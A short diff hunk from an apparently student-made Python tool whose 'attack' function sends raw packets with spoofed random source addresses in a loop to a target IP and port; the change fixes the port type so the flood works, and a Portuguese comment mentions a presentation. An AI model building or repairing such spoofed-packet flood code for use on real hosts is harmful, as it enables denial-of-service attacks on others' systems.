@@ -182,7 +182,7 @@ def attack(raw_socket,attack_type, local_ip, dest_ip, dest_port):
         packet = monta_pacote(0, attack_type, get_random_ip(), dest_ip,
                               randint(1800, 65533), int(dest_port), 5840, 54321)
 
-        raw_socket.sendto(packet, (dest_ip, dest_port))
+        raw_socket.sendto(packet, (dest_ip, int(dest_port)))
         i += 1
         #TODO: retirar esse sleep na apresentacao
         #sleep(1)
